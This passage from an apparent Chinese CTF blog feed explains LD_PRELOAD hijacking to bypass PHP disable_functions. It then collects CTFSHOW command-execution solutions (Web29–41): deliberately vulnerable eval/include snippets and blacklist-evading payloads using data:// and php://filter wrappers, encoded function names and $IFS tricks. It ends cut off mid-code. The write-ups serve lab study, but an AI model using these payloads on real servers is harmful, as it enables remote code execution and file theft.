b()同名的恶意函数，由于c_evil.so优先级较高，所以，a.bin将调用到c_evil.so内b()而非系统的c.so内b()，同时，c_evil.so可控，达到执行恶意代码的目的。基于这一思路，将突破disable_functions限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的 PHP函数、PHP环境下劫持系统函数注入代码。</p></blockquote><p>查看系统加载的共享对象<code>ldd /usr/bin/id</code></p><p><img src="/../images/disable-functions-bypass/image-20210717172619760.png"></p><p>由于可执行文件/usr/bin/id内含符号表,所以，运行<code>nm -D /usr/bin/id 2&gt;&amp;1</code>或<code>readelf -Ws /usr/bin/id</code>可查看该程序可能调用的系统 API 明细：</p><p><img src="/../images/disable-functions-bypass/image-20210717173012286.png"></p><p><code>strace -f /usr/bin/id 2&gt;&amp;1</code> 跟踪命令<code>/usr/bin/id</code>实际API调用情况</p><blockquote><p>操作系统环境下劫持系统函数注入代码。linux的环境变量LD_PRELOAD是一种类似win32 API hook的更优雅的实现，适用于打热补丁、读取进程空间数据、禁止程序调用指定 API、调试程序等等场景，甚至可以在不更改原始可执行文件前提下植入后门(管理员常用的/bin/ps)</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>具体见：<a href="https://www.freebuf.com/articles/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a></p><p>2021年7月17日20:47:31：强烈推荐阅读，内容详尽，对小白十分友好，看的时候直呼过瘾，看完后用手上的题验证所想，内心真的很激动。</p><p><strong>个人总结</strong></p><p>首先找到一个特殊PHP函数，要求是这个函数执行会调用两次<code>execve</code>，第一次是启动PHP解释器，第二次是启动一个新进程。利用第二次<code>execve</code>启动外部程序。</p><p>然后找到<code>__attribute__</code>，这个C语言扩展修饰符在加载共享对象的时候就会执行里面的代码，于是写入恶意代码将原来的正常代码给覆盖了，生成<code>evil.so</code>文件。</p><p>之后利用<code>putenv()</code>将<code>LD_PRELOAD</code>变量指向为自己的<code>evil.so</code>文件，也是利用<code>putenv()</code>将想要执行的代码放到系统变量。</p><p>逻辑如下：打入payload，恶意代码被写入到系统变量-&gt;执行特殊PHP函数-&gt;第一次execve启动PHP解释器，第二次execve启动新进程-&gt;新进程重新加载共享文件，<code>evil.so</code>被加载-&gt;触发自己写入的<code>__attribute__</code>-&gt;<code>__attribute__</code>中有<code>system()</code>，恶意代码在系统变量中，于是<code>system(&#39;恶意代码&#39;)</code></p><p>而这个特殊PHP函数如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//以下三个可以一起放着，函数被禁用也不需要注释，不影响</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mb_send_mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//以下两个没有则需要注释掉，否则无法正常执行</span><span class="token comment">// $img = Imagick("1.mp4"); //如果有ImageMagick这个扩展(文件必须存在)</span><span class="token comment">// imap_mail("", "", ""); //需要安装imap拓展</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体题目可见<code>刷题笔记:[SUCTF 2019]EasyWeb</code></p><h4 id="蚁剑实操"><a href="#蚁剑实操" class="headerlink" title="蚁剑实操"></a>蚁剑实操</h4><p><img src="/../images/disable-functions-bypass/image-20210717205438970.png"></p><p>然后创建副本(密码与原来的shell密码相同)，用蚁剑连接<code>/.antproxy.php</code></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> disable_functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CTFSHOW]命令执行合集</title>
      <link href="/p/496294805.html"/>
      <url>/p/496294805.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源于</p><p><a href="https://hellohy.top/huayang/1102.html#respond">【原创】ctfshow—web入门—命令执行 （29-77）（持续更新）</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/109837640">[CTFSHOW]命令执行</a></p><p>进行归纳总结。</p><h2 id="Web29-flag"><a href="#Web29-flag" class="headerlink" title="Web29 flag"></a>Web29 flag</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload1<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl fla?????"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload2<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload3<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl''ag.php`</span><span class="token punctuation">;</span>或者c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl“”ag.php`</span><span class="token punctuation">;</span>payload4<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl\ag.php`</span><span class="token punctuation">;</span><span class="token comment">//转义字符绕过</span>payload5<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>payload6<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nl flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload7<span class="token punctuation">:</span>c<span class="token operator">=</span>awk <span class="token string single-quoted-string">'&#123;printf $0&#125;'</span> flag<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web30-system-php"><a href="#Web30-system-php" class="headerlink" title="Web30 system|php"></a>Web30 system|php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>换其他函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>反引号 同<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web31-cat-sort-shell"><a href="#Web31-cat-sort-shell" class="headerlink" title="Web31 cat|sort|shell"></a>Web31 cat|sort|shell</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nl flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//扫描当前路径下文件返回数组->数组倒叙->输出下一个元素</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pos(localeconv()) 组成.点号，加上scandir就是扫描当下目录。具体看Web40</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`nl%09fl[abc]*`</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token string double-quoted-string">"\x73\x79\x73\x74\x65\x6d"</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl%09fl[a]*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>等价于<span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token string backtick-quoted-string">`strings%09f*`</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token string backtick-quoted-string">`strings\$IFS\$9f*`</span>必须加转义字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web32-echo-’"><a href="#Web32-echo-’" class="headerlink" title="Web32 echo|’|(|;"></a>Web32 echo|’|(|;</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>include不用括号，分号可以用?&gt;代替</p></blockquote><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=include$_GET[1]?>&amp;1=php://filter/read=convert.base64-encode/resource=flag.phpc=include$_GET[1]?>&amp;1=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>c=include$_GET[1]?>&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web33-36-0-9"><a href="#Web33-36-0-9" class="headerlink" title="Web33-36 [0-9]|/"></a>Web33-36 [0-9]|/</h2><p>33新增双引号</p><p>34新增冒号</p><p>35新增&lt;|=</p><p>36新增/|[0-9]</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=include$_GET[a]?>&amp;1=php://filter/read=convert.base64-encode/resource=flag.phpc=include$_GET[a]?>&amp;1=data://text/palin,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="Web37-include"><a href="#Web37-include" class="headerlink" title="Web37 include"></a>Web37 include</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=data://text/palin,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web38-php-file"><a href="#Web38-php-file" class="headerlink" title="Web38 php|file"></a>Web38 php|file</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|php|file/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web39-include加后缀"><a href="#Web39-include加后缀" class="headerlink" title="Web39 include加后缀"></a>Web39 include加后缀</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">?c=data:text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat fla?.php'</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web40-0-9-各种符号"><a href="#Web40-0-9-各种符号" class="headerlink" title="Web40 [0-9]|各种符号"></a>Web40 [0-9]|各种符号</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>括号检测的是中文括号。基本思路就是不带字符串不带数字纯函数读取。</p><blockquote><p>current()函数返回数组中的当前元素/单元，默认取第一个值<br>pos()函数同上，是current()函数的别名<br>reset()函数，当数组不为空时返回数组第一个单元的值，如果数组为空则返回FALSE</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//查看当下目录</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web41-0-9-a-z"><a href="#Web41-0-9-a-z" class="headerlink" title="Web41 [0-9]|[a-z]"></a>Web41 [0-9]|[a-z]</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token 